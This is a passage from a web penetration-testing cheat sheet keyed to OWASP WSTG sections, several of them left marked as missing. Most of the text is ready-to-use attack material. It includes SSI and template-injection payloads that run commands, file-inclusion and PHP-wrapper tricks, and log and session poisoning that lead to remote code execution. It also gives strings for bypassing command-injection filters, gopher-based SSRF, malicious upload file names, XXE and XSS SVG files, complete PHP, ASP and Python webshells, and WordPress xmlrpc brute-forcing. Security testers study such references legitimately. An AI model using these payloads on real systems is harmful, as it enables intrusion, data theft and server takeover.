(Need PHP functions to be enabled)

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.

### 4.7.8 Testing for SSI Injection (WSTG-INPV-08)

**Information disclosure:**

```
<!--#printenv -->
<!--#echo var="DOCUMENT_NAME" var="DOCUMENT_URI" var="DATE_LOCAL" var="LAST_MODIFIED" -->
```

**LFI:**

```
<!--#include virtual="config.inc.php" -->
```

(limited to files in the webroot directroy)

**RCE:**

```
<!--#exec cmd="cat /etc/passwd" -->
```

### 4.7.9 Testing for XPath Injection (WSTG-INPV-09)

❗❗❗MISSING❗❗❗

### 4.7.10 Testing for IMAP SMTP Injection (WSTG-INPV-10)

❗❗❗MISSING❗❗❗

### 4.7.11 Testing for Code Injection (WSTG-INPV-11)

❗❗❗MISSING❗❗❗

#### 4.7.11.1 Testing for Local File Inclusion

 - `https://pentest-experts.com/index.php?page=../../../../../etc/passwd` (local)
 - `https://pentest-experts.com/index.php?page=https://pentest-experts.com/sypps.txt` (remote)
 - `https://pentest-experts.com/index.php?page=ftp://pentest-experts.com/sypps.txt`  
   (remote via FTP in case WAF block `https://`)
 - `https://pentest-experts.com/index.php?page=\\192.168.1.2\sypps.txt`  
   (remote via SMB in case WAF block `https://` - Windows webserver only but works there even if `allow_url_include` is deactivated)

Try to include `https://127.0.0.1/somefile.html` frist do confirm RFI without traversing a firewall...

**Prepended scrings:**

In case a string get prepended (e.g. `include("lang_".$GET["lang"]);`) to the user controlled input of the loaded file, try to add `/` before the directory traversal to make the prepended string look like a directory - e.g.:

`https://pentest-experts.com/index.php?page=/../../../../../etc/passwd`

**Second order attacks:**

Test also for LFI in user supplied data, which is later read from the database - e.g.:

`❗❗❗ MISSING GOOD EXAMPLE ❗❗❗`

**Prepended stings:**

Many web-applications prepend string the the file inclusion path (e.g. `include($GET["lang"].".php");`) - to bypass this we have in old versions of PHP (before 5.5) this options:

 - Adding 2048 x `./` to the end of the in the path to exceed the 4096 character limit (`./` is removed by the OS when accessing a file)
 - Adding a `%00` byte after the injection (PHP uses `NUL` byte terminated strings)

##### PHP filters / wrappers

 - `php://filter/read=convert.base64-encode/resource=config.php`
 - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
 - `php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd`
 - `expect://whoami`  
   Expect wrapper need to be installed and activated for this attack to work
 - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA%2FPg%3D%3D&c=whoami`  
   (URL- and Base64 encoded or use in a GET parameter)  
   `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==`  
   (Only Base64 encoded for use in a POST parameter)  
   PHP webshell usage: run commands with GET parameter: `&c=whoami`
 - `curl -s -X POST --data '<?php system("whoami"); ?>' "https://pentest-experts.com/index.php?vuln_param=php://input"`  
   Input wrapper, which receive the webshell as POST data

##### LFI to RCE

**Log poisioning**

 1. Browse some URL with BrupSuite or ZAP and change the `User-Agent` field in the header to:  
`<?php echo system($_GET["c"]); ?>`
 2. Use the **access.log** to write a new shell to `/tmp`:  
`https://pentest-experts.com/read.php?file=../../../../../var/log/apache2/access.log&c=echo+'<?php+echo+system($_GET["c"]);+?>'>/tmp/s.php`
 3. Utilize the new shell:  
`https://pentest-experts.com/read.php?file=../../../../../tmp/s.php&c=ls+-l+/var/www/html/`

The User-Agent header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a number usually between 0-50).

Try also poisioning other logs like FTP or mailserver logs, which may log usernames after login attempts, etc. 

**Upload a image-file containing a webshell**

```php
GIF89a<?php system($_GET["c"]); ?>
```

Store this shell as `me.gif`, upload it to the webserver (e.g. as profile image) and include it then.

**Using the ZIP wrapper**

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php && zip shell.zip shell.php
```

Upload this file and incude it with

`?vuln_param=zip://./upload_dir/shell.zip%23shell.php?c=whoami`

**Using PHAR**

Create this php file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Then compile it into a phar file and rename it to jpg:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload this file and incude it with

`?vuln_param=phar://./upload_dir/shell.jpg%2Fshell.txt?c=whoami`

**PHP session poisioning**

Session data is stored at:

 - `/var/lib/php/sessions/sess_[SESSIONID]`
 - `C:\Windows\Temp\sess_[SESSIONID]`

 1. Examine the session data by including the file.
 2. Determine if any value in those file can be controlled
 3. Adding a webshell into that value (e.g. `<?php system($_GET["c"]); ?>`)
 4. Including the session file and running the webshell

**TIPPS**

 - Don't forget to scan for unused parameters - e.g. with  
   `/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
 - Useful wordlist for fuzzing can be found in `/usr/share/wordlists/SecLists/Fuzzing/LFI/`

**TOOLS**

 - https://github.com/mzfr/liffy
 - https://github.com/D35m0nd142/LFISuite
 - https://github.com/OsandaMalith/LFiFreak

#### 4.7.11.2 Testing for Remote File Inclusion

 - see: [LFI](#47111-testing-for-local-file-inclusion)

### 4.7.12 Testing for Command Injection (WSTG-INPV-12)

 - `commix --url="https://pentest-experts.com/ping.php?ip=INJECT_HERE"`

**Injection characters**

```
CHAR   URL ENC.    DESCRIPTION
-----  ----------  -------------------------[Table of Contents](#table-of-contents)

---
 ;     %3b         (Concatination of commands)
 \n    %0a         (Newline)
 &     %26         (Background)
 |     %7c         (Pipe)
 &&    %26%26      (Logical AND)
 ||    %7c%7c      (Logical OR)
 ``    %60%60      (Subshell)
 $()   %24%28%29   (Subshell)
```

**Bypassing space blacklist**

 - Encoding the space as `\x20`
 - Using a tab (`%09`)
 - Using `${IFS}` - a Linux environment variable containing the CLI argument speparator (usually the space)
 - Using the input redirection operator - e.g.: `cat</etc/passwd`
 - Using the bash brace expantion syntax - e.g.: `{cat,/etc/passwd}`

**Bypassing `\` and `/` blacklisting**

 - Using `${PATH:0:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<[)` in Linux (Character shifting)
 - Using `$env:HOMEPATH[0]` in Windows Powershell
 - Using `%HOMEPATH:~6,-5%` in Windows CMD (`-5%` is the length of the username)

**Bypassing `;` blacklisting**

 - Using `${LS_COLORS:10:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<:)` in Linux (Character shifting)

**Bypassing `|` blacklisting**

 - Using `<<<` and a subshell in Linux - e.g.: `grep${IFS}root<<<$(cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd)`

 **Bypassing command blacklists**

 - Adding aquotation marks `w"h"o"am"i` or `w'h'o'am'i`
 - Adding the positional character operator `who$@ami` (Linux only)
 - Adding the `\` character `w\ho\ami` (Linux only)
 - Adding the `^` character - e.g.: `who^ami` (Windows only)
 - Using mixed case `wHoAmI` (Windows only)
 - Using mixed case `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` or `$(a="WhOaMi";printf %s "${a,,}")` (Linux only)
 - Using reversed commands - e.g.: `$(rev<<<'imaohw')` (Linux only)
 - Using reversed commands - e.g.: `iex "$('imaohw'[-1..-20] -join '')"` (Windows Powershell only)
 - Using encoding - e.g. Base64: `bash<<<$(base64 -d<<<d2hvYW1p)` (Linux Only)
 - Using encoding - e.g. Base64: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` (Windows Powershell only)  
   ❗❗❗ Powershell use the characterset UTF-16LE and not UTF-8 ❗❗❗  
   Create the correct Base64 string on Linux: `echo -n "whoami" | iconv -f utf-8 -t utf-16le | base64`

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.

For more see: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses

Useful tools:

 - https://github.com/Bashfuscator/Bashfuscator
 - https://github.com/danielbohannon/Invoke-DOSfuscation


### 4.7.13 Testing for Format String Injection (WSTG-INPV-13)

❗❗❗MISSING❗❗❗

### 4.7.14 Testing for Incubated Vulnerability (WSTG-INPV-14)

❗❗❗MISSING❗❗❗

### 4.7.15 Testing for HTTP Splitting Smuggling (WSTG-INPV-15)

❗❗❗MISSING❗❗❗

### 4.7.16 Testing for HTTP Incoming Requests (WSTG-INPV-16)

❗❗❗MISSING❗❗❗

### 4.7.17 Testing for Host Header Injection (WSTG-INPV-17)

❗❗❗MISSING❗❗❗

### 4.7.18 Testing for Server-side Template Injection (WSTG-INPV-18)

Test string - should break almost all templates: 

`${{<%[%'"}}%\.`

**Test payloads**

```
${7*7}
a{*comment*}b
${"z".join("ab")}
{{7*'7'}}
```

**Results**

| Output    | Engine    |
|-----------|-----------|
| `7777777` | Jinja2    |
| `49`      | Twig      |
| `ab`      | Smarty    |
| `azb`     | Mako      |
| Orig.     | Not vuln. |

**Jinja2**

**Information disclosure:**

```jinja2
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```

**LFI:**

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**RCE:**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}
```

**Twig**

Information disclosure:

```twig
{{ _self }}
```

**LFI (work only with the PHP Symfony framework):**

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

**RCE:**

```twig
{{ ['cat /etc/passwd'] | filter('system') }}
```

Useful tool to automate: https://github.com/vladko312/SSTImap

 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test`  
   Run identification
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test -D '/etc/passwd' passwd.txt`   
   Download file
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test -S whoami`  
   Run OS command
 - `python3 sstimap.py -u https://pentest-experts.com/index.php?q=test --os-shell`

### 4.7.19 Testing for Server-Side Request Forgery (WSTG-INPV-19)

**Using SSRF as portscanner**

```bash
seq 1 10000 > ports.txt
ffuf -w ports.txt -u "https://pentest-experts.com/index.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "ssrf_endpoint=https://192.168.1.2:FUZZ/" -fr "Failed to connect to"
```

**Using SSRF to scan files and directories**

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "https://pentest-experts.com/index.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "ssrf_endpoint=https://192.168.1.2/FUZZ" -fr "404 Not Found"
```

**Reading files from the local filesystem via SSRF**

Use `file://` in the URL to to read loacl files - e.g. sourcecode disclosure: 

`ssrf_endpoint=file:///var/www/html/index.php`

**Using the gopher protocal to submit post requests to an internal endpoint**

Given we need to send the HTTP request

```http
POST /admin.php HTTP/1.1
Host: 192.168.1.2
Content-Length: 21
Content-Type: application/x-www-form-urlencoded

user=admin&pass=admin
```

We need to URL encode this request and use it in the gopher request as URL:

`gopher://192.168.1.2:80/_[REQUEST_GOES_HERE]`

Herby the port need to be specified, as gopher would otherwise use pot 70 as default.

This goopher url need then be URL encoded to be used in the request:

`ssrf_endpoint=gopher://192.168.1.2:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0AHost%3A%20192.168.1.2%0AContent-Length%3A%2021%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Auser%3Dadmin%26pass%3Dadmin`

gopher%3A%2F%2F192.168.1.2%3A80%2F_POST%2520%252Fadmin.php%2520HTTP%252F1.1%250AHost%253A%2520dateserver.htb%250AContent-Length%253A%252013%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250A%250Aadminpw%253Dadmin
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01

Useful tool: https://github.com/tarunkant/Gopherus 

**Blind SSRF**

Test if path to known existing and know non existing files or URLs produce a different outputs. 

If you see a difference in those requests (e.g. different response messages) but no additional data like the file contents in the output, SSRF is blind.

[Table of Contents](#table-of-contents)

---


## 4.8 Testing for Error Handling

### 4.8.1 Testing for Improper Error Handling (WSTG-ERRH-01)

❗❗❗MISSING❗❗❗

### 4.8.2 Testing for Stack Traces (WSTG-ERRH-02)

❗❗❗MISSING❗❗❗

[Table of Contents](#table-of-contents)

---

## 4.9 Testing for Weak Cryptography

### 4.9.1 Testing for Weak Transport Layer Security (WSTG-CRYP-01)

 - `testssl.sh https://pentest-experts.com` - Testing weak cipher support  
   https://github.com/testssl/testssl.sh

### 4.9.2 Testing for Padding Oracle (WSTG-CRYP-02)

❗❗❗MISSING❗❗❗

### 4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels (WSTG-CRYP-03)

❗❗❗MISSING❗❗❗

### 4.9.4 Testing for Weak Encryption (WSTG-CRYP-04)

❗❗❗MISSING❗❗❗

[Table of Contents](#table-of-contents)

---

## 4.10 Business Logic Testing

### 4.10.1 Test Business Logic Data Validation (WSTG-BUSL-01)

❗❗❗MISSING❗❗❗

### 4.10.2 Test Ability to Forge Requests (WSTG-BUSL-02)

❗❗❗MISSING❗❗❗

### 4.10.3 Test Integrity Checks (WSTG-BUSL-03)

❗❗❗MISSING❗❗❗

### 4.10.4 Test for Process Timing (WSTG-BUSL-04)

❗❗❗MISSING❗❗❗

### 4.10.5 Test Number of Times a Function Can Be Used Limits (WSTG-BUSL-05)

❗❗❗MISSING❗❗❗

### 4.10.6 Testing for the Circumvention of Work Flows (WSTG-BUSL-06)

❗❗❗MISSING❗❗❗

### 4.10.7 Test Defenses Against Application Misuse (WSTG-BUSL-07)

❗❗❗MISSING❗❗❗

### 4.10.8 Test Upload of Unexpected File Types (WSTG-BUSL-08)

❗❗❗MISSING❗❗❗

### 4.10.9 Test Upload of Malicious Files (WSTG-BUSL-09)

#### Pass filter with alternative PHP fileextentions

 - In case `.php` files are not allowed to be uploaded or not executed, try `.php5`, `.php7`, `.phtml`, etc.

**List of extensions**

```
.php
.php3
.php4
.php5
.php7
.php8
.phpwnd
.pht
.phtm
.phtml
.phar
.phpt
.phps
.gif.php
.php.gif
.php%00.gif
.php\x00.gif
```

Herby exploits `.gif.php` a weak regex check of a filename and `.php.gif` a weak server configuration, which would try to execute all files with a `.php` in the filename.

The character injection (e.g. `.php\x00.gif`) try to exploit the 

```
%20
%0a
%00
%0d%0a
%0d0a
\x20
\x0a
\x00
\x0d\x0a
\x0d0a
/
.\
.
…
...
:
```

**Wordlist generator:**

```python
#!/usr/bin/env python3
with open("wordlist.txt", "w", encoding="UTF-8") as f:
    for e in ['.php', '.php3', '.php4', '.php5', '.php7', '.php8', '.phpwnd', '.pht', '.phtm', '.phtml', '.phar', '.phpt', '.phps']:
        # Different extensions
        f.write(f"s{e}\n")
        # Double extension
        f.write(f"s.gif{e}\n")
        f.write(f"s{e}.gif\n")
        # Character injection
        for c in ['%20', '%0a', '%00', '%0d%0a', '%0d0a', '\\x20', '\\x0a', '\\x00', '\\x0d0a', '\\x0d\\x0a', '/', './', '.', '…', ':', '...']:
            f.write(f"s{e}{c}.gif\n")
            f.write(f"s{c}{e}.gif\n")
            f.write(f"s.gif{e}{c}\n")
            f.write(f"s.gif{c}{e}\n")
```

Use the wordlist for upload and GET-request fuzzing. 

❗❗❗ Successfull upload do not always mean the file was written correctly. ❗❗❗

#### Execute php-shell on NGINX after upload with wrong file-extension

 - Given a PHP webshell was uploaded as shell.gif on an NGINX server, the script can be run in PHP conext by adding `/shell.php&c=pwd` after the filename - a full URL-example would be:  
`https://pentest-experts.com/upload/shell.gif/shell.php?c=pwd`

#### XXE via SVG files

Reading files based on path:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Reading PHP sourcecode

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Output the Base64 encoded version of the file index.php.

A vulnerable file-viewer within a website could be attacked with other document types as `docx`, `pdf`, etc.

#### XSS via SVG files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(1);</script>
</svg>
```

#### Injection via filename

Naming a file like 

 - `me$(cat /etc/passwd).jpg` may lead to a command injection if used in a system command
 - `me<script>alert(1)</script>.jpg` may lead to XSS if the filename is displayed
 - `me';select sleep(5); -- .jpg` may leed to SQLi if used in a SQL query.

#### Upload directroy discovery

 - Bruteforce with tools liek `gobuster`
 - Provoke a error message:
   - To long filenames (5000 characters+)
   - Reserved characters (`|`, `<`, `>`, `$`, `*`, `?`)
   - Reserved names like `CON`, `COM1`, `LPT1`, ... (Windows only) 

[Table of Contents](#table-of-contents)

---

## 4.11 Client-side Testing

### 4.11.1 Testing for DOM-Based Cross Site Scripting (WSTG-CLNT-01)

❗❗❗MISSING❗❗❗

### 4.11.2 Testing for JavaScript Execution (WSTG-CLNT-02)

❗❗❗MISSING❗❗❗

### 4.11.3 Testing for HTML Injection (WSTG-CLNT-03)

❗❗❗MISSING❗❗❗

 - see: [Reflected XSS](#471-testing-for-reflected-cross-site-scripting-wstg-inpv-01)

### 4.11.4 Testing for Client-side URL Redirect (WSTG-CLNT-04)

❗❗❗MISSING❗❗❗

### 4.11.5 Testing for CSS Injection (WSTG-CLNT-04)

❗❗❗MISSING❗❗❗

### 4.11.6 Testing for Client-side Resource Manipulation (WSTG-CLNT-06)

❗❗❗MISSING❗❗❗

### 4.11.7 Testing Cross Origin Resource Sharing (WSTG-CLNT-07)

❗❗❗MISSING❗❗❗

### 4.11.8 Testing for Cross Site Flashing (WSTG-CLNT-08)

❗❗❗MISSING❗❗❗

### 4.11.9 Testing for Clickjacking (WSTG-CLNT-09)

❗❗❗MISSING❗❗❗

### 4.11.10 Testing WebSockets (WSTG-CLNT-10)

❗❗❗MISSING❗❗❗

### 4.11.11 Testing Web Messaging (WSTG-CLNT-11)

❗❗❗MISSING❗❗❗

### 4.11.12 Testing Browser Storage (WSTG-CLNT-12)

❗❗❗MISSING❗❗❗

### 4.11.13 Testing for Cross Site Script Inclusion (WSTG-CLNT-13)

❗❗❗MISSING❗❗❗

[Table of Contents](#table-of-contents)

---

## 4.12 API Testing

### 4.12.1 Testing GraphQL (WSTG-APIT-01)

❗❗❗MISSING❗❗❗

[Table of Contents](#table-of-contents)

---

# A. APENDIX

## A.1 Quick & easy servers

 - `sudo python3 -m http.server 80` (start webserver on port 80)
 - `sudo php -S 0.0.0.0:80` (start webserver on port 80)
 - `sudo python -m pyftpdlib -p 21` (start ftp server on port 21)
 - `sudo impacket-smbserver -smb2support share $(pwd)` (start SMB server and share the curent directroy)

[Table of Contents](#table-of-contents)

---

## A.2 Webshells

**PHP**

```php
<?php echo system($_GET["c"]) ?>
```

Usage: `https://hacked.box/upload/shell.php?c=whoami`

**ASP**

```asp
<% eval request('c') %>
```

Usage: `https://hacked.box/upload/shell.asp?c=whoami`

**Python**

```python
#!/usr/bin/env python3
import cgi
import cgitb
import subprocess

cgitb.enable()

print("Content-Type: text/html")
print()

fs = cgi.FieldStorage()
try:
    cmd = fs['c'].value.strip()

    p = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.wait()
    out, err = p.communicate()
    out = "<pre>" + out.decode("UTF-8") + "<hr>" + err.decode("UTF-8") + "<pre>"

except KeyError:
    out = "Use <pre>?c=[command]</pre> to execute a command!"
  
except:
    out = "Unknown error"

print(out)
```

Usage: `https://hacked.box/upload/shell.py?c=whoami`

[Table of Contents](#table-of-contents)

---

## A.3 Wordpress

#### Important files and folders

 - `/index.php`  
 - `/license.txt`  
   Containing the version number 
 - `/readme.html`  
   Containing the version number 
 - `/wp-activate.php`  
   Used for email activation when setting up the site
 - `/wp-admin/`  
   Folder where the admin panel resides
 - `/wp-comments-post.php`  
 - `/wp-config.php`  
   Config file fontaining DB name, DB user, DB password, auth. keys, salts, etc.
 - `/wp-content/`  
   Main folder where plugins and themes get stored
 - `/wp-content/uploads/`  
   Folder where any file uploaded to the platform is stored
 - `/wp-cron.php`  
   Handles scheduled tasks
 - `/wp-includes/`  
   Folder where core files (certificates, fonts, JS and PHP files, widgets, ...) are stored
 - `/wp-links-opml.php`  
 - `/wp-load.php`  
   Initializes WordPress by loading the necessary configuration and core files
 - `/wp-login.php`  
 - `/wp-mail.php`  
 - `/wp-settings.php`  
   Configures the core functionality of WordPress, including loading plugin files, theme support, and initializing global variables and constants required for the application to run.
 - `/wp-signup.php`  
 - `/wp-trackback.php`  
   Handles incoming trackback requests, which are a legacy method for notifying a website that another site has linked to one of its posts.
 - `/xmlrpc.php`  
   Potential exploitation see blow (replaced by the WordPress RestAPI)

#### User roles

 - **Administrator**
 - **Editor** (Publish and manage posts, including the posts of other users)
 - **Author** (Publish and manage their own posts)
 - **Contributor** (Write and manage their own posts but cannot publish them)
 - **Subscriber** (Normal users who can browse posts and edit their profiles)

#### Wordpress manual enumration

**Version:**

 - Check WP meta-tag with the name `generator` - e.g.:  
`<meta name="generator" content="WordPress 4.4" />`
 - Check `readme.html`, `readme.txt`, `changelog.txt`, `license.txt`, ...
 - Inspect HTTP response-headers for `X-Powered-By` line
 - Check for version-info on the login-page (`wp-login.php`)
 - Check REST-API (usually under `https://pentest-expers.com/wp-json/`)
 - Analyze JS- and CSS-files for version information - e.g.:  
`https://pentest-expers.com/wp-embed.min.js?ver=4.4`
 - Inspect the `generator`-tag in RSS feed - e.g.:  
`https://pentest-expers.com/?feed=rss2`  
There you will find:  
`<generator>https://wordpress.org/?v=4.4</generator>`

**Plugins:**

```bash
curl -s -X GET 'https://pentest-expers.com/' | grep 'wp-content/plugins/*' | sed "s/'/\"/g" | sed 's/<script/""""/g' | cut -d '"' -f 6 | sort -u
```

**Themes:**

```bash
curl -s -X GET 'https://pentest-expers.com/' | grep 'wp-content/themes' | cut -d "'" -f 6 | sort -u
```

**Users:**

 - `curl -s -I -X GET https://pentest-expers.com/?author=1` - Look for response code `200` or `301`  
   Test ID 1 till ID n with ZAP, BurpSuite, ...  
   Redirect show then the username: ``
 - `curl -s -I -X GET https://pentest-expers.com/author/USERNAME` - Look for response code `200`
 - `curl https://pentest-expers.com/wp-json/wp/v2/users` - via API

**Useful tools:**

 - `wpscan`
 - `msfconsole`
 - https://github.com/xmendez/wfuzz

#### Attacking WordPress `xmlrpc.php`

Getting a list of alloed methods:

```bash
curl -ks -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" https://pentest-experts.com/xmlrpc.php
```

**Utilizing the `pingback.ping` method**

 - Call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP by pointing to an attacker-controlled host with this XML code:  

    ```xml
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param>
          <value><string>https://pentest-experts.com/</string></value>
        </param>
        <param>
          <value><string>https://blog.victim.com/2024/10/some-blog-post/</string></value>
        </param>
      </params>
    </methodCall>
    ```

 - Cross-Site Port Attack (XSPA) - call the `pingback.ping` method against itself or other internal hosts on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences - example XML:  

    ```xml
    <methodCall>
      <methodName>pingback.ping</methodName>
      <params>
        <param>
          <value><string>https://internalhost.local.lan:8080/</string></value>
        </param>
        <param>
          <value><string>https://blog.victim.com/2024/10/some-blog-post/</string></value>
        </param>
      </params>
    </methodCall>
    ```  
    This can be used as well for CSRF and SSRF (limited to only GET parameters).

**Password bruteforce:**

```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>USERNAME</value></param><param><value>PASSWORD</value></param></params></methodCall>" https://pentest-experts.com/xmlrpc.php
```  
HTTP statuscode `403` means invalid cendentials.

Using WPScan:

```bash
wpscan --url "https://pentest-experts.com" --password-attack xmlrpc -t 20 -U admin,user1,user2 -P /usr/share/wordlists/rockyou.txt 
```

#### RCE via the Theme Editor 

 - Need usually admin access or some expoit
 - Editing a file like `404.php` of a non used theme is the stealtiest approach  
   Reverse shell can be accessed by:  
   `https://pentest-experts.com/wp-content/themes/THEME-NAME/404.php`
 - Alernative approach would be editing the `404.php` of the active theme and then access a nun existent URL.

[Table of Contents](#table-of-contents)

---

## A.4 SOAP Webservice

 - Check if you can find the `WSDL` file (*= WS description*) - common URLs would be:
   - `https://soap.pentest-experts.com/wsdl.wsdl`
   - `https://soap.pentest-experts.com/wsdl?wsdl`
   - `https://soap.pentest-experts.com/?wsdl`
   - `https://soap.pentest-experts.com/disco.disco`
   - `https://soap.pentest-experts.com/disco?disco`
   - `https://soap.pentest-experts.com/?disco`
 - Try to identify not documented methods by the try & error method / fuzzing

#### SOAPAction spoofing

 1. Specify a allowed method in body - e.g. `LoginRequest` with the Parameters for the restricted method (here `cmd`):  

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
<soap:Body>
  <LoginRequest xmlns="http://tempuri.org/">
    <cmd>whoami</cmd>
  </LoginRequest>
</soap:Body></soap:Envelope>
```

 2. Specify the restricted method in the HTTP header:  
    `SOAPAction: "ExecuteCommand"`

If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass restrictions.

#### Pay attention to `style="rpc"` in the `soap:operation` tags: 

If you see for example the following lines in WSDL:

```xml
...
<soap:operation soapAction="urn:ws-user-account#getAdminInfo" style="rpc"/>
<input> 
  <soap:body use="encoded" namesapce="urn:ws-user-account" encodeStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
...
```
You need to use the following header-line:

`SOAPAction: urn:ws-user-account#getAdminInfo`

Then get rid of all data within the `<soapenv:Envelope ...>`-tag and only use an empty tag in the body:

```xml
<soapenv:Envelope ...>
</soapenv:Envelope>
```

In RPC-style SOAP, the SOAPAction header can fully define the operation, making a body redundant.

#### API attacks

APIs can be vulnerable to the same attacks like as a website:

 - [Information disclosure](#415-review-webpage-content-for-information-leakage-wstg-info-05)
 - [SQLi](#475-testing-for-sql-injection-wstg-inpv-05)
 - [File uploads](#4109-test-upload-of-malicious-files-wstg-busl-09)
 - [LFI / RFI](#47111-testing-for-local-file-inclusion)
 - [XSS](#471-testing-for-reflected-cross-site-scripting-wstg-inpv-01)
 - [CSRF](#465-testing-for-cross-site-request-forgery-wstg-sess-05) / [SSRF](#4719-testing-for-server-side-request-forgery-wstg-inpv-19)
 - [XXE](#477-testing-for-xml-injection-wstg-inpv-07)
 - [RegExp DOS](#RegExp-DOS)
 - etc.

Thatfor those have to be tested as thorough as the website itself!

**Approach**

 1. Fuzzing to find potential parameters / endpoints (`ffuf`)
 2. Testing for vulnerabilities (LFI, SQLi, etc.)
 3. Try encoding for parameter values (ULRencoding, Base64 encoding, ...)

[Table of Contents](#table-of-contents)

---

## A.4 Linux privilege escalation

 - https://roriwa.github.io/pentest/tools/LinPEAS/
 - https://gtfobins.github.io/

[Table of Contents](#table-of-contents)

---

## A.5 Useful links

 - https://github.com/swisskyrepo/PayloadsAllTheThings

[Table of Contents](#table-of-contents)

---





































# OLD STUFF








#### RegExp DOS

❗❗❗MISSING❗❗❗












## Fuzzing for hidden URL parameters

 - `ffuf -u "https://pentest-experts.com/index.php?FUZZ=val" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -v`  
   Fuzzing of GET / POST parameters or values.  
   Use `-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'` for POST parameter or value fuzzing.  
 - **Use browser-plugins like the `UA spoofer` to fake a older Browser like IE and test if a different version of the website is served❗❗❗ Maybe there is a fallback to an oder an vuln. version of the site...**















## Broken authentication

 - Test for weak password policies
 - Try to enumerate users (e.g. different errors for non existent user and wornd password)
 - Try to bruteforce one account with multiple passwords, multiple accounts with one password (password spraying)
 - Try to bruteforce OTPs / 2FA tokens
 - Try to bruteforce password reset tokens
 - Try to bruteforce security questions like maiden names or city of birth with common values
 - Try to provide the correct answer for your account and then check if you can overwrite the user in the password change step - e.g.: chang the username in `POST` request data like that:  
   `user=myusername&new_password=SuperSecure1!`
 - Try to access priv. ressources (e.g. `admin.php`) without authenticating or with a normal user
 - Try to ignore redirects and check if the body contain the protected ressource.
 - Try to tamper with URL parameters related to authentication - e.g. `edit_profile.php?uid=1234`, the `uid=1234` or `role=user` Cookie, etc.
 - Try to bruteforce or reverse engineer session tokens.  
    - Thatfor obtain multiple session toekens and check the randomness of those.  
      Look out for petterns like prepended or appended strings, incrementing numbers, etc.
    - Furthermore check if the session token can be reconstructed by known values like username, user_id, etc. and combinations of those.
    - Look out for known encodings like Base64, URLencoding or HEX encoding etc.
 - Try session fixation
 - Check if logout also invalidates the session on the server and not just delete the cookies on the user side.

Useful tools: `hydra`, `ffuf`, `ZAP proxy`


















## Session attacks


#### Weak CSRF Tokens

 - Check if anti-csrf tokens are static and not not change for each request  
   - In this case check if the tokens can be predicted  
     e.g. `md5(id)`, `sha256(username)`, `sha512(date + id)`, ...
 - Test for bypass methods:
   - Try to remove the csrf token in case the check only happens if a token is send
